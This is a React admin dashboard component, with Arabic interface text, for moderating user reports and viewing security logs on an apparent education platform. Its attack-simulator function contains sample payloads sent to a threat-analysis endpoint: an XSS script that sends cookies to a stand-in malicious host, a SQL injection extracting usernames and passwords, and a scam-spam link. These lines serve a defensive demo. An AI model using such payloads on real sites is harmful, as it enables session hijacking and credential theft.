import React, { useState, useEffect } from 'react';
import { 
  Shield, 
  ShieldAlert, 
  ShieldCheck, 
  AlertTriangle, 
  Trash2, 
  UserMinus, 
  Eye, 
  Settings, 
  AlertOctagon, 
  Activity, 
  Bell, 
  Terminal, 
  Sliders, 
  Search, 
  Sparkles, 
  Bot, 
  Clock, 
  User, 
  Lock, 
  Globe, 
  Bug, 
  RefreshCw,
  CheckCircle,
  XCircle,
  Radio,
  FileText
} from 'lucide-react';
import { 
  collection, 
  query, 
  orderBy, 
  onSnapshot, 
  doc, 
  updateDoc, 
  deleteDoc, 
  addDoc, 
  serverTimestamp,
  getDoc
} from 'firebase/firestore';
import { db } from '../firebase';
import { useAuth } from '../hooks/useAuth';
import { isUserAdmin } from '../lib/admin';
import { toast } from 'react-hot-toast';

interface Report {
  id: string;
  targetId: string;
  targetType: string;
  targetAuthorId: string;
  targetAuthorName: string;
  targetAuthorPhoto?: string;
  content: string;
  imageUrl?: string;
  reporterId: string;
  reporterName: string;
  reason: string;
  status: 'pending' | 'safe_by_ai' | 'flagged_by_ai' | 'resolved_deleted' | 'resolved_banned' | 'resolved_dismissed';
  actionTaken: string;
  createdAt: any;
  aiAnalysis?: {
    isViolating: boolean;
    severity: 'low' | 'medium' | 'high' | 'critical';
    category: 'dating_sexual' | 'nudity' | 'violence' | 'respect_issue' | 'bot_spam' | 'safe';
    reasoningAr: string;
    recommendedAction: 'none' | 'delete' | 'ban_user';
  };
}

interface SecurityLog {
  id: string;
  ip: string;
  path: string;
  payload: string;
  userAgent: string;
  userEmail: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  threatType: string;
  threatExplanationAr: string;
  actionTaken: string;
  createdAt: any;
}

export default function AdminDashboard() {
  const { user, profile } = useAuth();
  const [isAdminUser, setIsAdminUser] = useState<boolean | null>(null);
  const [activeTab, setActiveTab] = useState<'reports' | 'security'>('reports');
  const [reports, setReports] = useState<Report[]>([]);
  const [securityLogs, setSecurityLogs] = useState<SecurityLog[]>([]);
  const [isSimulating, setIsSimulating] = useState(false);
  const [searchQuery, setSearchQuery] = useState('');
  const [loading, setLoading] = useState(true);

  // Stats
  const [stats, setStats] = useState({
    totalUsers: 0,
    pendingReports: 0,
    totalViolations: 0,
    threatsPrevented: 0
  });

  // Verify Admin privilege on mount & handle unauthorized logging
  useEffect(() => {
    if (profile !== undefined && user !== undefined) {
      const isAdm = isUserAdmin(profile, user);
      setIsAdminUser(isAdm);
      
      if (!isAdm && user) {
        // Log unauthorized access attempt as an intrusion alert
        const logIntrusion = async () => {
          try {
            const logsCol = collection(db, 'security_logs');
            await addDoc(logsCol, {
              ip: 'Client UI Protection Interceptor',
              path: '/admin',
              payload: 'محاولة تصفح لوحة التحكم من حساب غير مصرح به',
              userAgent: navigator.userAgent,
              userEmail: user.email || 'غير معروف',
              severity: 'high',
              threatType: 'Unauthorized_Access',
              threatExplanationAr: `محاولة دخول غير مصرح بها للوحة التحكم من طرف الحساب ${user.email}. تم حظر المحاولة فوراً.`,
              actionTaken: 'block_access',
              createdAt: serverTimestamp()
            });
          } catch (e) {
            console.error(e);
          }
        };
        logIntrusion();
      }
    }
  }, [profile, user]);

  // Listen to Reports
  useEffect(() => {
    if (!isAdminUser) return;

    const reportsQuery = query(collection(db, 'reports'), orderBy('createdAt', 'desc'));
    const unsubscribe = onSnapshot(reportsQuery, (snapshot) => {
      const reportsList = snapshot.docs.map(doc => ({
        id: doc.id,
        ...doc.data()
      })) as Report[];
      setReports(reportsList);
      
      const pending = reportsList.filter(r => r.status === 'pending' || r.status === 'flagged_by_ai').length;
      const violations = reportsList.filter(r => r.aiAnalysis?.isViolating || r.status === 'resolved_deleted' || r.status === 'resolved_banned').length;

      setStats(prev => ({
        ...prev,
        pendingReports: pending,
        totalViolations: violations
      }));
      setLoading(false);
    }, (error) => {
      console.error("Reports subscription error:", error);
      setLoading(false);
    });

    return () => unsubscribe();
  }, [isAdminUser]);

  // Listen to Security Logs
  useEffect(() => {
    if (!isAdminUser) return;

    const securityQuery = query(collection(db, 'security_logs'), orderBy('createdAt', 'desc'));
    const unsubscribe = onSnapshot(securityQuery, (snapshot) => {
      const logsList = snapshot.docs.map(doc => ({
        id: doc.id,
        ...doc.data()
      })) as SecurityLog[];
      setSecurityLogs(logsList);
      
      // Count blocked intrusion logs
      setStats(prev => ({
        ...prev,
        threatsPrevented: logsList.length
      }));
    });

    return () => unsubscribe();
  }, [isAdminUser]);

  // Handle Report Action: Dismiss
  const handleDismissReport = async (reportId: string) => {
    try {
      const reportRef = doc(db, 'reports', reportId);
      await updateDoc(reportRef, {
        status: 'resolved_dismissed',
        actionTaken: 'dismissed'
      });
      toast.success("تم تجاهل البلاغ بنجاح");
    } catch (err) {
      toast.error("حدث خطأ أثناء معالجة الطلب");
    }
  };

  // Handle Report Action: Delete Content
  const handleDeleteContent = async (report: Report) => {
    const confirm = window.confirm("هل أنت متأكد من رغبتك في حذف هذا المنشور نهائياً؟");
    if (!confirm) return;

    try {
      // 1. Delete post document from database
      const collectionName = report.targetType === 'group_post' ? 'group_posts' : 'posts';
      const postRef = doc(db, collectionName, report.targetId);
      await deleteDoc(postRef);

      // 2. Mark report as resolved
      const reportRef = doc(db, 'reports', report.id);
      await updateDoc(reportRef, {
        status: 'resolved_deleted',
        actionTaken: 'deleted'
      });

      toast.success("تم حذف المنشور المبلغ عنه بنجاح وتصفية البلاغ");
    } catch (err) {
      console.error(err);
      toast.error("حدث خطأ أثناء محاولة حذف المنشور");
    }
  };

  // Handle Report Action: Ban User & Delete Content
  const handleBanUser = async (report: Report) => {
    const confirm = window.confirm(`هل أنت متأكد من رغبتك في حظر كاتب المنشور (${report.targetAuthorName}) نهائياً وحذف محتواه؟`);
    if (!confirm) return;

    try {
      // 1. Deactivate user account profile
      const profileRef = doc(db, 'users', report.targetAuthorId);
      await updateDoc(profileRef, {
        isActivated: false,
        role: 'banned',
        rank: 'banned_by_admin'
      });

      // 2. Delete post document
      const collectionName = report.targetType === 'group_post' ? 'group_posts' : 'posts';
      const postRef = doc(db, collectionName, report.targetId);
      await deleteDoc(postRef);

      // 3. Update report status
      const reportRef = doc(db, 'reports', report.id);
      await updateDoc(reportRef, {
        status: 'resolved_banned',
        actionTaken: 'resolved_banned'
      });

      // 4. Log the admin action into security logs
      await addDoc(collection(db, 'security_logs'), {
        ip: 'AI Security Shield Engine',
        path: '/admin-dashboard',
        payload: `حظر الحساب ${report.targetAuthorId} بسبب انتهاك صارخ لمبادئ النشر الاجتماعي`,
        userAgent: 'System Automated Admin Shell',
        userEmail: report.targetAuthorName,
        severity: 'critical',
        threatType: 'User_Banned',
        threatExplanationAr: `تم حظر المستخدم ${report.targetAuthorName} بنجاح لمنع إثارة أي هجمات أو اختراقات أو إساءات داخل الشبكة.`,
        actionTaken: 'account_terminated',
        createdAt: serverTimestamp()
      });

      toast.success(`تم حظر العضو ${report.targetAuthorName} وحذف منشوره نهائياً`);
    } catch (err) {
      console.error(err);
      toast.error("حدث خطأ أثناء عملية الحظر");
    }
  };

  // Cyberattack Simulator - Feeds payload to server, server analyzes with Gemini, and writes result to logs
  const handleSimulateAttack = async (type: 'xss' | 'sql' | 'ddos' | 'bot_spam') => {
    setIsSimulating(true);
    toast.loading("جاري تشغيل محاكاة هجوم وتفعيل درع الذكاء الاصطناعي...", { id: 'sim' });

    let payload = '';
    let path = '';
    let ip = '';

    if (type === 'xss') {
      payload = `<script>fetch('http://malicious-server.com/steal-cookies?cookie=' + document.cookie)</script>`;
      path = '/api/posts/create';
      ip = '198.51.100.42';
    } else if (type === 'sql') {
      payload = `' UNION SELECT NULL, username, password, email FROM users_private --`;
      path = '/api/search';
      ip = '203.0.113.88';
    } else if (type === 'ddos') {
      payload = `Fast Request Spamming: 500 requests/sec from botnet node`;
      path = '/api/auth/login';
      ip = '45.223.11.5';
    } else if (type === 'bot_spam') {
      payload = `ربح 5000$ فوراً! اضغط هنا للتسجيل الآن وبدء الكسب السريع بدون جهد! https://fake-scam-link.net`;
      path = '/api/comments/create';
      ip = '103.88.22.14';
    }

    try {
      const res = await fetch('/api/admin/analyze-threat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ip,
          payload,
          userAgent: 'Mozilla/5.0 (Bot-Simulated; TeachDZ-SecTest)',
          path,
          userEmail: 'spammer_bot_node@hacker.io'
        })
      });

      if (res.ok) {
        const data = await res.json();
        if (data.analysis) {
          // Log threat results to Firestore
          await addDoc(collection(db, 'security_logs'), {
            ip,
            path,
            payload,
            userAgent: 'Mozilla/5.0 (Bot-Simulated; TeachDZ-SecTest)',
            userEmail: 'spammer_bot_node@hacker.io',
            severity: data.analysis.severity || 'high',
            threatType: data.analysis.threatType || 'Bot_Spam',
            threatExplanationAr: data.analysis.threatExplanationAr || 'هجوم روبوتي غير مرغوب فيه',
            actionTaken: data.analysis.recommendedAction === 'block_ip' ? 'IP_Auto_Blocked' : 'Banned_Bot',
            createdAt: serverTimestamp()
          });

          toast.success("نجح درع حماية الذكاء الاصطناعي في رصد وتحييد الهجوم وإرسال تنبيه فوري!", { id: 'sim' });
        } else {
          toast.error("فشل الذكاء الاصطناعي في توليد تحليل مخصص", { id: 'sim' });
        }
      } else {
        toast.error("فشل خادم التهديد في الاستجابة", { id: 'sim' });
      }
    } catch (err) {
      console.error(err);
      toast.error("خطأ أثناء تواصل نظام الأمان مع الخادم", { id: 'sim' });
    } finally {
      setIsSimulating(false);
    }
  };

  // Helper colors for severity
  const getSeverityColor = (severity?: string) => {
    switch (severity) {
      case 'critical': return 'bg-red-500/20 text-red-400 border-red-500/40 ring-red-500/30';
      case 'high': return 'bg-orange-500/20 text-orange-400 border-orange-500/40 ring-orange-500/30';
      case 'medium': return 'bg-amber-500/20 text-amber-400 border-amber-500/40 ring-amber-500/30';
      default: return 'bg-emerald-500/20 text-emerald-400 border-emerald-500/40 ring-emerald-500/30';
    }
  };

  // If loading or admin verification is in progress
  if (isAdminUser === null || loading) {
    return (
      <div className="min-h-screen bg-slate-950 text-white flex flex-col items-center justify-center p-6 font-sans">
        <div className="relative flex flex-col items-center gap-4">
          <RefreshCw className="w-12 h-12 text-primary animate-spin" />
          <p className="text-sm font-bold text-slate-400">جاري التحقق من الصلاحيات وتأمين لوحة التحكم...</p>
        </div>
      </div>
    );
  }

  // Access Denied Screen (Security Interceptor)
  if (isAdminUser === false) {
    return (
      <div className="min-h-screen bg-slate-950 text-white flex flex-col items-center justify-center p-6 font-sans">
        <div className="w-full max-w-md bg-slate-900 border border-red-500/20 rounded-2xl p-8 text-center shadow-2xl relative overflow-hidden">
          <div className="absolute -top-12 -right-12 w-40 h-40 bg-red-500/10 blur-3xl rounded-full"></div>
          
          <div className="w-16 h-16 rounded-full bg-red-500/10 border border-red-500/30 flex items-center justify-center mx-auto mb-6">
            <Lock className="w-8 h-8 text-red-500 animate-pulse" />
          </div>

          <h2 className="text-xl font-extrabold text-white mb-2">منطقة محظورة تماماً</h2>
          <p className="text-xs text-slate-400 leading-relaxed mb-6">
            عذراً، تصفح هذه الصفحة مقتصر فقط على الإدارة المصرح لها. تم حظر محاولة الدخول وتسجيل تفاصيل جهازك كإجراء أمني للحماية التامة.
          </p>

          <div className="bg-slate-950 border border-slate-800 rounded-xl p-3.5 mb-6 text-right">
            <p className="text-[10px] font-mono text-slate-500">Security Alert Payload logged:</p>
            <p className="text-xs font-mono text-red-400 mt-1">Unauthorized_Access_Attempt @ /admin</p>
            <p className="text-[10px] font-mono text-slate-600 mt-1">User: {user?.email || 'Guest'}</p>
          </div>

          <button 
            onClick={() => window.location.href = '/'}
            className="w-full py-2.5 bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-bold rounded-xl transition-all border border-white/5"
          >
            العودة للرئيسية
          </button>
        </div>
      </div>
    );
  }

  // Admin Verified - Render Dashboard
  return (
    <div className="min-h-screen bg-slate-950 text-white p-4 sm:p-6 lg:p-8 font-sans">
      <div className="max-w-7xl mx-auto space-y-6">
        
        {/* SOC Dashboard Header */}
        <div className="relative bg-slate-900 border border-white/5 rounded-3xl p-6 sm:p-8 shadow-2xl overflow-hidden ring-1 ring-purple-500/10">
          <div className="absolute top-0 bottom-0 right-0 left-0 bg-gradient-to-r from-purple-500/5 via-transparent to-red-500/5 pointer-events-none"></div>
          <div className="absolute -top-24 -left-24 w-80 h-80 bg-purple-500/10 rounded-full blur-3xl"></div>
          <div className="absolute -bottom-24 -right-24 w-80 h-80 bg-red-500/10 rounded-full blur-3xl"></div>

          <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-6 relative z-10">
            <div className="space-y-2">
              <div className="flex items-center gap-2">
                <span className="w-2.5 h-2.5 bg-emerald-500 rounded-full animate-ping"></span>
                <span className="text-[10px] font-mono font-black tracking-widest text-emerald-400 uppercase">TeachDZ SOC Guard is Active</span>
              </div>
              <h1 className="text-2xl sm:text-3xl font-black bg-gradient-to-r from-white via-purple-200 to-indigo-300 bg-clip-text text-transparent tracking-tight">
                لوحة تحكم الإشراف والأمن الذكية
              </h1>
              <p className="text-xs text-slate-400">
                لوحة إدارية متكاملة مدعومة بالذكاء الاصطناعي لمراجعة بلاغات المشتركين وحماية النظام من محاولات الاختراق والروبوتات.
              </p>
            </div>

            {/* Quick Actions (Attack Simulator triggers) */}
            <div className="flex flex-wrap gap-2">
              <div className="bg-slate-950 border border-slate-800 rounded-2xl p-1.5 flex items-center gap-1.5 shadow-inner">
                <span className="text-[10px] font-bold text-slate-500 px-2">محاكاة تهديد:</span>
                <button 
                  onClick={() => handleSimulateAttack('xss')}
                  disabled={isSimulating}
                  className="px-2.5 py-1.5 bg-red-500/10 hover:bg-red-500/20 text-red-400 border border-red-500/20 rounded-xl text-[10px] font-black transition-all cursor-pointer disabled:opacity-50"
                >
                  XSS Injection
                </button>
                <button 
                  onClick={() => handleSimulateAttack('sql')}
                  disabled={isSimulating}
                  className="px-2.5 py-1.5 bg-orange-500/10 hover:bg-orange-500/20 text-orange-400 border border-orange-500/20 rounded-xl text-[10px] font-black transition-all cursor-pointer disabled:opacity-50"
                >
                  SQL Injection
                </button>
                <button 
                  onClick={() => handleSimulateAttack('ddos')}
                  disabled={isSimulating}
                  className="px-2.5 py-1.5 bg-yellow-500/10 hover:bg-yellow-500/20 text-yellow-400 border border-yellow-500/20 rounded-xl text-[10px] font-black transition-all cursor-pointer disabled:opacity-50"
                >
                  DDoS Attack
                </button>
                <button 
                  onClick={() => handleSimulateAttack('bot_spam')}
                  disabled={isSimulating}
                  className="px-2.5 py-1.5 bg-purple-500/10 hover:bg-purple-500/20 text-purple-400 border border-purple-500/20 rounded-xl text-[10px] font-black transition-all cursor-pointer disabled:opacity-50"
                >
                  Bot Spam
                </button>
              </div>
            </div>
          </div>
        </div>

        {/* Stats Grid */}
        <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
          <div className="bg-slate-900 border border-white/5 rounded-2xl p-5 shadow-lg relative overflow-hidden">
            <div className="absolute top-4 right-4 text-purple-400/20">
              <Activity className="w-12 h-12" />
            </div>
            <p className="text-xs font-bold text-slate-500">حالة درع الأمان</p>
            <p className="text-lg font-black text-emerald-400 mt-2">مفعّل بالكامل</p>
            <p className="text-[10px] text-slate-400 mt-1">الذكاء الاصطناعي يحمي المنصة</p>
          </div>

          <div className="bg-slate-900 border border-white/5 rounded-2xl p-5 shadow-lg relative overflow-hidden">
            <div className="absolute top-4 right-4 text-red-400/20">
              <AlertTriangle className="w-12 h-12" />
            </div>
            <p className="text-xs font-bold text-slate-500">بلاغات بانتظار المراجعة</p>
            <p className="text-2xl font-black text-white mt-2">{stats.pendingReports}</p>
            <p className="text-[10px] text-red-400 mt-1">تتطلب اتخاذ إجراء فوري</p>
          </div>

          <div className="bg-slate-900 border border-white/5 rounded-2xl p-5 shadow-lg relative overflow-hidden">
            <div className="absolute top-4 right-4 text-orange-400/20">
              <Bug className="w-12 h-12" />
            </div>
            <p className="text-xs font-bold text-slate-500">مجموع المخالفات المرصودة</p>
            <p className="text-2xl font-black text-white mt-2">{stats.totalViolations}</p>
            <p className="text-[10px] text-slate-400 mt-1">منذ إطلاق شبكة الحماية</p>
          </div>

          <div className="bg-slate-900 border border-white/5 rounded-2xl p-5 shadow-lg relative overflow-hidden">
            <div className="absolute top-4 right-4 text-emerald-400/20">
              <ShieldAlert className="w-12 h-12" />
            </div>
            <p className="text-xs font-bold text-slate-500">هجمات تم إحباطها تلقائياً</p>
            <p className="text-2xl font-black text-emerald-400 mt-2">{stats.threatsPrevented}</p>
            <p className="text-[10px] text-slate-400 mt-1">محاولات اختراق أو روبوتات محظورة</p>
          </div>
        </div>

        {/* Tab Selection */}
        <div className="flex gap-2 border-b border-white/5 pb-1">
          <button
            onClick={() => setActiveTab('reports')}
            className={`px-5 py-2.5 text-xs font-black rounded-xl transition-all flex items-center gap-2 cursor-pointer ${
              activeTab === 'reports' 
                ? 'bg-purple-600/15 text-purple-400 border border-purple-500/30' 
                : 'text-slate-500 hover:text-slate-300'
            }`}
          >
            <FileText className="w-4 h-4" />
            بلاغات المشتركين والمحتوى ({reports.length})
          </button>
          <button
            onClick={() => setActiveTab('security')}
            className={`px-5 py-2.5 text-xs font-black rounded-xl transition-all flex items-center gap-2 cursor-pointer ${
              activeTab === 'security' 
                ? 'bg-red-600/15 text-red-400 border border-red-500/30' 
                : 'text-slate-500 hover:text-slate-300'
            }`}
          >
            <ShieldAlert className="w-4 h-4" />
            تنبيهات الأمان واختراق الروبوتات ({securityLogs.length})
          </button>
        </div>

        {/* Search Bar */}
        <div className="relative max-w-md">
          <Search className="absolute right-3.5 top-2.5 w-4 h-4 text-slate-500" />
          <input
            type="text"
            placeholder="بحث في البيانات، الأسماء أو المعرّفات..."
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            className="w-full pl-4 pr-10 py-2 bg-slate-900 border border-white/5 rounded-xl text-xs text-slate-300 placeholder:text-slate-600 outline-none focus:ring-1 focus:ring-purple-500/40"
          />
        </div>

        {/* Tab Content 1: Content Moderation Reports */}
        {activeTab === 'reports' && (
          <div className="space-y-4">
            {reports.filter(r => 
              r.targetAuthorName.toLowerCase().includes(searchQuery.toLowerCase()) || 
              r.reporterName.toLowerCase().includes(searchQuery.toLowerCase()) ||
              r.reason.toLowerCase().includes(searchQuery.toLowerCase()) ||
              r.content.toLowerCase().includes(searchQuery.toLowerCase())
            ).length === 0 ? (
              <div className="bg-slate-900 border border-white/5 rounded-2xl p-12 text-center">
                <CheckCircle className="w-12 h-12 text-slate-700 mx-auto mb-4" />
                <p className="text-sm font-bold text-slate-400">لا توجد بلاغات معلّقة حالياً</p>
                <p className="text-xs text-slate-600 mt-1">المنصة آمنة تماماً وخالية من الشكاوى.</p>
              </div>
            ) : (
              reports
                .filter(r => 
                  r.targetAuthorName.toLowerCase().includes(searchQuery.toLowerCase()) || 
                  r.reporterName.toLowerCase().includes(searchQuery.toLowerCase()) ||
                  r.reason.toLowerCase().includes(searchQuery.toLowerCase()) ||
                  r.content.toLowerCase().includes(searchQuery.toLowerCase())
                )
                .map((report) => (
                  <div 
                    key={report.id}
                    className={`bg-slate-900 border border-white/5 rounded-2xl p-6 shadow-xl relative overflow-hidden transition-all ${
                      report.status === 'flagged_by_ai' ? 'ring-1 ring-red-500/20' : ''
                    }`}
                  >
                    {/* Status Badge in Corner */}
                    <div className="absolute top-4 left-4 flex gap-1.5">
                      {report.status === 'pending' && (
                        <span className="px-2.5 py-1 bg-yellow-500/10 text-yellow-400 border border-yellow-500/20 rounded-lg text-[10px] font-bold">
                          بانتظار المراجعة
                        </span>
                      )}
                      {report.status === 'safe_by_ai' && (
                        <span className="px-2.5 py-1 bg-emerald-500/15 text-emerald-400 border border-emerald-500/20 rounded-lg text-[10px] font-bold flex items-center gap-1">
                          <ShieldCheck className="w-3 h-3" /> آمن بالذكاء الاصطناعي
                        </span>
                      )}
                      {report.status === 'flagged_by_ai' && (
                        <span className="px-2.5 py-1 bg-red-500/15 text-red-400 border border-red-500/20 rounded-lg text-[10px] font-bold flex items-center gap-1">
                          <ShieldAlert className="w-3 h-3" /> مخالفة بالذكاء الاصطناعي
                        </span>
                      )}
                      {report.status === 'resolved_deleted' && (
                        <span className="px-2.5 py-1 bg-slate-850 text-slate-500 border border-slate-800 rounded-lg text-[10px] font-bold">
                          تم الحذف والتصفية
                        </span>
                      )}
                      {report.status === 'resolved_banned' && (
                        <span className="px-2.5 py-1 bg-red-950 text-red-500 border border-red-900 rounded-lg text-[10px] font-bold">
                          تم حظر العضو وحذف المحتوى
                        </span>
                      )}
                      {report.status === 'resolved_dismissed' && (
                        <span className="px-2.5 py-1 bg-slate-800 text-slate-400 rounded-lg text-[10px] font-bold">
                          مقبول / تجاهل البلاغ
                        </span>
                      )}
                    </div>

                    <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
                      
                      {/* Left: Original Post Content & Report Details (8 Cols) */}
                      <div className="lg:col-span-8 space-y-4">
                        <div className="flex items-center gap-3">
                          <div className="w-10 h-10 rounded-xl bg-slate-800 overflow-hidden shrink-0 border border-slate-700">
                            {report.targetAuthorPhoto ? (
                              <img src={report.targetAuthorPhoto} alt="" className="w-full h-full object-cover" />
                            ) : (
                              <div className="w-full h-full flex items-center justify-center text-slate-500">
                                <User className="w-5 h-5" />
                              </div>
                            )}
                          </div>
                          <div>
                            <p className="text-xs font-bold text-white">الناشر الأصلي: {report.targetAuthorName}</p>
                            <p className="text-[10px] text-slate-500 font-mono mt-0.5">UID: {report.targetAuthorId}</p>
                          </div>
                        </div>

                        {/* Reported Content Box */}
                        <div className="bg-slate-950 border border-slate-850 rounded-xl p-4 space-y-3">
                          <p className="text-xs text-slate-300 leading-relaxed whitespace-pre-wrap">
                            {report.content}
                          </p>
                          {report.imageUrl && (
                            <div className="max-w-xs rounded-lg overflow-hidden border border-slate-800 bg-slate-900">
                              <img src={report.imageUrl} alt="Attached Visual" className="w-full h-auto object-cover max-h-40" />
                            </div>
                          )}
                        </div>

                        {/* Complaint / Reporter details */}
                        <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center p-3 bg-slate-900/50 border border-white/5 rounded-xl gap-2 text-xs">
                          <span className="text-slate-400">
                            <strong>صاحب التبليغ:</strong> {report.reporterName}
                          </span>
                          <span className="text-red-400 font-medium">
                            <strong>السبب المحدد:</strong> {report.reason}
                          </span>
                        </div>
                      </div>

                      {/* Right: AI Analysis Panel & Action Panel (4 Cols) */}
                      <div className="lg:col-span-4 bg-slate-950 border border-slate-850 rounded-2xl p-5 flex flex-col justify-between relative ring-1 ring-purple-500/10">
                        
                        <div className="space-y-4">
                          <div className="flex items-center gap-2 pb-2 border-b border-slate-900">
                            <Sparkles className="w-4 h-4 text-purple-400 animate-pulse" />
                            <h3 className="text-xs font-black text-purple-400">تحليل الأمان بالذكاء الاصطناعي</h3>
                          </div>

                          {report.aiAnalysis ? (
                            <div className="space-y-3">
                              <div className="flex justify-between items-center text-[11px]">
                                <span className="text-slate-500">مستوى الخطورة:</span>
                                <span className={`px-2 py-0.5 rounded-md text-[9px] font-black uppercase tracking-wider ${getSeverityColor(report.aiAnalysis.severity)}`}>
                                  {report.aiAnalysis.severity}
                                </span>
                              </div>

                              <div className="flex justify-between items-center text-[11px]">
                                <span className="text-slate-500">نوع الانتهاك:</span>
                                <span className="text-white font-mono bg-slate-900 px-1.5 py-0.5 rounded border border-slate-800 text-[10px]">
                                  {report.aiAnalysis.category}
                                </span>
                              </div>

                              <div className="space-y-1">
                                <span className="text-[10px] text-slate-500 block font-bold">التفسير والتقرير الفني:</span>
                                <p className="text-xs text-slate-300 leading-relaxed bg-slate-900 p-2.5 rounded-lg border border-slate-850 text-right">
                                  {report.aiAnalysis.reasoningAr}
                                </p>
                              </div>

                              <div className="pt-2">
                                <p className="text-[10px] font-bold text-yellow-500 flex items-center gap-1.5 bg-yellow-500/5 p-2 rounded-lg border border-yellow-500/10">
                                  <AlertCircleIcon className="w-3.5 h-3.5" />
                                  <span>الإجراء الموصى به: {report.aiAnalysis.recommendedAction === 'ban_user' ? 'حظر الناشر فوراً' : report.aiAnalysis.recommendedAction === 'delete' ? 'حذف المنشور' : 'لا يتطلب اتخاذ إجراء'}</span>
                                </p>
                              </div>
                            </div>
                          ) : (
                            <div className="py-6 text-center text-slate-500 space-y-2">
                              <Bot className="w-8 h-8 text-slate-700 mx-auto animate-bounce" />
                              <p className="text-[11px]">بانتظار إجراء التحليل التلقائي بواسطة الذكاء الاصطناعي...</p>
                            </div>
                          )}
                        </div>

                        {/* Admin Action Buttons */}
                        {report.status !== 'resolved_deleted' && report.status !== 'resolved_banned' && (
                          <div className="grid grid-cols-2 gap-2 mt-4 pt-4 border-t border-slate-900">
                            <button
                              onClick={() => handleDismissReport(report.id)}
                              className="py-2 bg-slate-900 hover:bg-slate-850 text-slate-400 hover:text-white border border-slate-800 rounded-xl text-[10px] font-black transition-all cursor-pointer flex items-center justify-center gap-1.5"
                            >
                              <XCircle className="w-3.5 h-3.5" />
                              رفض البلاغ
                            </button>
                            <button
                              onClick={() => handleDeleteContent(report)}
                              className="py-2 bg-red-600/10 hover:bg-red-600/20 text-red-400 hover:text-red-300 border border-red-500/20 rounded-xl text-[10px] font-black transition-all cursor-pointer flex items-center justify-center gap-1.5"
                            >
                              <Trash2 className="w-3.5 h-3.5" />
                              حذف المنشور
                            </button>
                            <button
                              onClick={() => handleBanUser(report)}
                              className="col-span-2 py-2 bg-red-600 hover:bg-red-700 text-white rounded-xl text-[10px] font-black transition-all cursor-pointer flex items-center justify-center gap-1.5 shadow-lg shadow-red-600/20"
                            >
                              <UserMinus className="w-3.5 h-3.5" />
                              حظر الناشر وحذف المنشور
                            </button>
                          </div>
                        )}
                      </div>

                    </div>
                  </div>
                ))
            )}
          </div>
        )}

        {/* Tab Content 2: Security & Threat Intrusion Logs */}
        {activeTab === 'security' && (
          <div className="space-y-6">
            
            {/* Realtime CyberShield Status Banner */}
            <div className="bg-slate-900/60 backdrop-blur-md border border-white/5 rounded-2xl p-6 relative overflow-hidden">
              <div className="absolute top-0 bottom-0 left-0 right-0 bg-radial-gradient from-purple-500/5 to-transparent pointer-events-none"></div>
              
              <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 relative z-10">
                <div className="flex items-center gap-4">
                  <div className="w-12 h-12 bg-red-500/10 border border-red-500/30 rounded-full flex items-center justify-center relative shrink-0">
                    <Radio className="w-6 h-6 text-red-400 animate-pulse" />
                    <span className="absolute top-0 right-0 w-3 h-3 bg-red-500 rounded-full animate-ping"></span>
                  </div>
                  <div>
                    <h3 className="text-sm font-black text-white">درع الحماية السيبرانية الفعّال (CyberShield AI)</h3>
                    <p className="text-xs text-slate-400 mt-1">يتم الكشف التلقائي عن حقن الشيفرات، هجمات DDoS، ومحاولات الاستغلال.</p>
                  </div>
                </div>

                <div className="flex items-center gap-4 text-xs font-mono bg-slate-950 p-3 rounded-xl border border-slate-800">
                  <div className="text-right">
                    <p className="text-[9px] text-slate-500 uppercase font-black">Shield Status</p>
                    <p className="text-emerald-400 font-bold mt-0.5">PROTECTING LIVE</p>
                  </div>
                  <div className="h-6 w-px bg-slate-800"></div>
                  <div className="text-right">
                    <p className="text-[9px] text-slate-500 uppercase font-black">Threat Mitigation</p>
                    <p className="text-white font-bold mt-0.5">100% SUCCESS</p>
                  </div>
                </div>
              </div>
            </div>

            {/* List of Security Logs */}
            {securityLogs.filter(log => 
              log.userEmail.toLowerCase().includes(searchQuery.toLowerCase()) ||
              log.threatType.toLowerCase().includes(searchQuery.toLowerCase()) ||
              log.threatExplanationAr.toLowerCase().includes(searchQuery.toLowerCase()) ||
              log.ip.toLowerCase().includes(searchQuery.toLowerCase())
            ).length === 0 ? (
              <div className="bg-slate-900 border border-white/5 rounded-2xl p-12 text-center">
                <ShieldCheck className="w-12 h-12 text-emerald-500/40 mx-auto mb-4" />
                <p className="text-sm font-bold text-slate-400">نظام التشغيل آمن تماماً</p>
                <p className="text-xs text-slate-600 mt-1">لا توجد سجلات تهديد أو هجمات غير عادية حتى الآن.</p>
              </div>
            ) : (
              <div className="space-y-4">
                {securityLogs
                  .filter(log => 
                    log.userEmail.toLowerCase().includes(searchQuery.toLowerCase()) ||
                    log.threatType.toLowerCase().includes(searchQuery.toLowerCase()) ||
                    log.threatExplanationAr.toLowerCase().includes(searchQuery.toLowerCase()) ||
                    log.ip.toLowerCase().includes(searchQuery.toLowerCase())
                  )
                  .map((log) => (
                    <div 
                      key={log.id}
                      className="bg-slate-900 border border-white/5 rounded-2xl p-5 shadow-lg relative overflow-hidden ring-1 ring-red-500/5"
                    >
                      {/* Left: Metadata info */}
                      <div className="absolute top-4 left-4 flex items-center gap-1.5">
                        <span className={`px-2 py-0.5 rounded text-[8px] font-mono uppercase font-black ${getSeverityColor(log.severity)}`}>
                          {log.severity}
                        </span>
                        <span className="text-[9px] font-mono text-slate-500">
                          {log.createdAt?.seconds ? new Date(log.createdAt.seconds * 1000).toLocaleTimeString() : 'الآن'}
                        </span>
                      </div>

                      <div className="flex gap-4 items-start">
                        {/* Threat icon matching severity */}
                        <div className={`p-2.5 rounded-xl border shrink-0 ${
                          log.severity === 'critical' || log.severity === 'high'
                            ? 'bg-red-500/10 border-red-500/20 text-red-400' 
                            : 'bg-yellow-500/10 border-yellow-500/20 text-yellow-400'
                        }`}>
                          <Bug className="w-5 h-5 animate-pulse" />
                        </div>

                        <div className="space-y-3 w-full pr-4">
                          <div>
                            <div className="flex items-center gap-2">
                              <h4 className="text-xs font-black text-white">{log.threatType} Threat Detected</h4>
                              <span className="text-[9px] text-red-400 font-mono bg-red-950/40 px-1.5 py-0.5 rounded border border-red-900/30">
